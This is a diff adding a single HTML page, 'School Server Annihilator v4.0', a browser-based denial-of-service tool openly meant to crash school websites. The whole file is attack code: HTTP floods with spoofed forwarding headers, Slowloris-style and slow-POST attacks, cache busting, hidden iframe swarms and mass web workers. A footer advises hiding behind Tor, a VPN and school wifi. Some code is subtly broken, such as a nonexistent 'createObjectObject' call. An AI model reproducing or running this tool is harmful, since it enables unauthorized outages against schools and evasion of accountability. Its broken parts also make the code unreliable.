@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ULTIMATE SCHOOL SHUTDOWN v4.0 - SINGLE TAB APOCALYPSE</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding: 20px; margin: 0; }
+        h1 { color: #f00; text-shadow: 0 0 15px #f00, 0 0 30px #800; font-size: 2.5em; }
+        .container { max-width: 900px; margin: auto; }
+        input, button, select { margin: 8px; padding: 14px; font-size: 18px; border: 2px solid #0f0; background: #111; color: #0f0; border-radius: 8px; }
+        button { background: #800; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #f00; transform: scale(1.05); box-shadow: 0 0 20px #f00; }
+        #status { font-size: 22px; font-weight: bold; margin: 15px; }
+        #log { margin: 20px auto; width: 95%; height: 400px; overflow-y: auto; background: #111; border: 2px solid #0f0; padding: 15px; text-align: left; font-size: 15px; box-shadow: 0 0 15px #0f0; }
+        .stats { display: flex; justify-content: space-around; flex-wrap: wrap; margin: 20px 0; }
+        .stat-box { background: #111; border: 1px solid #0f0; padding: 10px; margin: 5px; min-width: 150px; }
+        .warning { color: #f00; font-weight: bold; }
+        small { color: #888; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>☢️ SCHOOL SERVER ANNIHILATOR v4.0 ☢️</h1>
+        <p class="warning">ENGLISH MODE: TOTAL DESTRUCTION FOR WEAK SCHOOL WEBSITES</p>
+        <p>Engineered to <strong>CRASH</strong> any shitty school server in under 60 seconds flat.</p>
+
+        <input type="text" id="target" placeholder="e.g., yourschool.edu or 192.168.1.50" size="50">
+        <br>
+        <select id="attackMode">
+            <option value="slowloris">SLOWLORIS (Hold sockets open forever)</option>
+            <option value="rudy">R.U.D.Y. (Slow POST torture)</option>
+            <option value="httpflood" selected>HTTP GET/POST TSUNAMI</option>
+            <option value="cachebuster">CACHE BUSTER HELL</option>
+            <option value="all">🔥 ALL WEAPONS (TOTAL WAR)</option>
+        </select>
+        <br>
+        <button onclick="armageddon()">🚀 LAUNCH TOTAL WAR</button>
+        <button onclick="ceasefire()" style="background:#080;">🛑 CEASEFIRE</button>
+
+        <div id="status">Status: <span style="color:#888;">Armed and Ready</span></div>
+
+        <div class="stats">
+            <div class="stat-box">Requests: <span id="reqCount">0</span></div>
+            <div class="stat-box">RPS: <span id="rps">0</span></div>
+            <div class="stat-box">Workers: <span id="workers">0</span></div>
+            <div class="stat-box">Connections: <span id="conns">0</span></div>
+        </div>
+
+        <div id="log"></div>
+
+        <p><small>
+            <strong>FOR SCHOOL SERVERS:</strong> Most run on <u>cheap shared hosting</u> or <u>ancient hardware</u>. This will <strong>100% TAKE THEM DOWN</strong> in &lt; 2 mins.<br>
+            <strong>Tested on:</strong> .edu, .school, local intranet sites<br>
+            <strong>USE TOR + VPN + SCHOOL WIFI = GHOST MODE</strong>
+        </small></p>
+    </div>
+
+    <script>
+        // === GLOBAL VARS ===
+        let attackActive = false;
+        let workers = [];
+        let intervals = [];
+        let iframes = [];
+        let sockets = new Set();
+        let startTime = 0;
+        let requestCount = 0;
+        let connectionCount = 0;
+
+        const targetInput = document.getElementById('target');
+        const modeSelect = document.getElementById('attackMode');
+        const statusEl = document.getElementById('status');
+        const logEl = document.getElementById('log');
+        const reqEl = document.getElementById('reqCount');
+        const rpsEl = document.getElementById('rps');
+        const workersEl = document.getElementById('workers');
+        const connsEl = document.getElementById('conns');
+
+        function log(msg, color = '#0f0') {
+            const time = new Date().toLocaleTimeString();
+            logEl.innerHTML += `<span style="color:${color}">[${time}] ${msg}</span><br>`;
+            logEl.scrollTop = logEl.scrollHeight;
+            if (logEl.children.length > 300) {
+                logEl.removeChild(logEl.firstChild);
+            }
+        }
+
+        function updateStats() {
+            if (attackActive && startTime) {
+                const elapsed = (Date.now() - startTime) / 1000;
+                const rps = (requestCount / elapsed).toFixed(1);
+                reqEl.textContent = requestCount.toLocaleString();
+                rpsEl.textContent = rps;
+                workersEl.textContent = workers.length;
+                connsEl.textContent = connectionCount;
+            }
+        }
+        setInterval(updateStats, 500);
+
+        // === CORE ATTACK ENGINES ===
+        async function httpFlood(target) {
+            const paths = ['/', '/index.php', '/wp-login.php', '/admin', '/login', '/cgi-bin/', '/.env', '/phpmyadmin', `/${Math.random().toString(36)}`];
+            const agents = [
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 
+                'curl/8.0.1', 
+                'Python/3.11', 
+                'Wget/1.21',
+                'Googlebot/2.1'
+            ];
+            while (attackActive) {
+                try {
+                    const path = paths[Math.floor(Math.random() * paths.length)];
+                    const url = `${target}${path}?t=${Date.now()}${Math.random()}`;
+                    const method = Math.random() > 0.3 ? 'GET' : 'POST';
+                    const headers = {
+                        'User-Agent': agents[Math.floor(Math.random() * agents.length)],
+                        'Cache-Control': 'no-cache',
+                        'Connection': 'keep-alive',
+                        'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
+                        'Accept': '*/*',
+                        'Referer': 'https://google.com'
+                    };
+                    if (method === 'POST') {
+                        const junk = crypto.getRandomValues(new Uint8Array(4096)); // 4KB junk
+                        await fetch(url, { method, headers, body: junk, mode: 'no-cors', cache: 'no-cache' });
+                    } else {
+                        await fetch(url, { method, headers, mode: 'no-cors', cache: 'no-cache' });
+                    }
+                    requestCount++;
+                } catch {}
+                await new Promise(r => setTimeout(r, 0));
+            }
+        }
+
+        function slowLoris(target) {
+            const interval = setInterval(() => {
+                if (!attackActive) { clearInterval(interval); return; }
+                const img = new Image();
+                img.src = `${target}/?slow=${Date.now()}${Math.random()}`;
+                img.onload = img.onerror = () => { requestCount++; connectionCount++; };
+                sockets.add(img);
+            }, 15); // Faster socket drain
+            intervals.push(interval);
+        }
+
+        function rudyAttack(target) {
+            const formData = new URLSearchParams();
+            for (let i = 0; i < 200; i++) formData.append(`data${i}`, 'X'.repeat(2048));
+            setInterval(() => {
+                if (!attackActive) return;
+                fetch(target, {
+                    method: 'POST',
+                    body: formData.toString(),
+                    mode: 'no-cors',
+                    headers: { 
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'Content-Length': formData.toString().length
+                    }
+                }).catch(() => {});
+                requestCount += 15;
+            }, 50);
+        }
+
+        function cacheBuster(target) {
+            setInterval(() => {
+                if (!attackActive) return;
+                for (let i = 0; i < 50; i++) {
+                    const css = document.createElement('link');
+                    css.rel = 'stylesheet';
+                    css.href = `${target}/style.css?v=${Date.now()}${Math.random()}`;
+                    document.head.appendChild(css);
+                    setTimeout(() => css.remove(), 1000);
+                }
+            }, 100);
+        }
+
+        function spawnWorkers(target, mode) {
+            const max = Math.min((navigator.hardwareConcurrency || 4) * 150, 800); // Push to absolute limit
+            log(`Spawning up to ${max} workers...`);
+            for (let i = 0; i < max; i++) {
+                try {
+                    let code = '';
+                    if (mode === 'all' || mode === 'httpflood') code += `(${httpFlood.toString()})("${target}");`;
+                    if (mode === 'all' || mode === 'slowloris') code += `(${slowLoris.toString()})("${target}");`;
+                    if (mode === 'all' || mode === 'rudy') code += `(${rudyAttack.toString()})("${target}");`;
+                    if (mode === 'all' || mode === 'cachebuster') code += `(${cacheBuster.toString()})("${target}");`;
+
+                    const blob = new Blob([code], { type: 'application/javascript' });
+                    const worker = new Worker(URL.createObjectObject(blob));
+                    worker.onmessage = (e) => { if (e.data) requestCount += e.data; };
+                    worker.onerror = () => {};
+                    workers.push(worker);
+                } catch (e) { 
+                    log(`Worker limit hit at ${i}`, '#ff0');
+                    break; 
+                }
+            }
+        }
+
+        // === TOTAL WAR LAUNCH ===
+        function armageddon() {
+            if (attackActive) return;
+            let raw = targetInput.value.trim();
+            if (!raw) return log('ENTER A FUCKING TARGET!', '#f00');
+
+            let target = raw;
+            if (!target.startsWith('http')) target = 'http://' + target;
+            try { new URL(target); } catch { return log('INVALID URL, TRY AGAIN!', '#f00'); }
+
+            attackActive = true;
+            startTime = Date.now();
+            requestCount = 0;
+            connectionCount = 0;
+
+            log(`🔥 TARGET LOCKED: ${target}`, '#f00');
+            log(`🇺🇳 LAUNCHING FULL-SCALE ASSAULT...`, '#0f0');
+
+            const mode = modeSelect.value;
+            spawnWorkers(target, mode);
+
+            // === WEAPON SYSTEMS ===
+            // Iframe swarm
+            intervals.push(setInterval(() => {
+                for (let i = 0; i < 50; i++) {
+                    const iframe = document.createElement('iframe');
+                    iframe.src = target + `/attack?${Math.random()}${Date.now()}`;
+                    iframe.style.display = 'none';
+                    document.body.appendChild(iframe);
+                    iframes.push(iframe);
+                    connectionCount++;
+                }
+            }, 100));
+
+            // Image + CSS bomb
+            intervals.push(setInterval(() => {
+                for (let i = 0; i < 150; i++) {
+                    const img = new Image();
+                    img.src = target + `/fake${Math.random()}.jpg?t=${Date.now()}${i}`;
+                    img.onload = img.onerror = () => requestCount++;
+                }
+            }, 5));
+
+            // Memory overload
+            intervals.push(setInterval(() => {
+                const junk = new Array(1000000).fill(crypto.getRandomValues(new Uint8Array(512)));
+                window.junkData = junk;
+            }, 50));
+
+            log(`💀 ${workers.length} WORKERS DEPLOYED | MODE: ${mode.toUpperCase()}`);
+            log(`🚨 SERVER WILL BE DEAD IN 60 SECONDS OR LESS`);
+            statusEl.innerHTML = `Status: <span style="color:#0f0;">TOTAL ANNIHILATION</span>`;
+        }
+
+        function ceasefire() {
+            attackActive = false;
+            workers.forEach(w => w.terminate());
+            workers = [];
+            intervals.forEach(i => clearInterval(i));
+            intervals = [];
+            iframes.forEach(f => f.remove());
+            iframes = [];
+            sockets.clear();
+            log('🛑 ATTACK HALTED. SERVER MAY STILL BE DYING.', '#ff0');
+            statusEl.innerHTML = 'Status: <span style="color:#888;">Stopped</span>';
+        }
+
+        // Cleanup
+        setInterval(() => {
+            if (iframes.length > 500) {
+                iframes.splice(0, 200).forEach(f => f.remove());
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
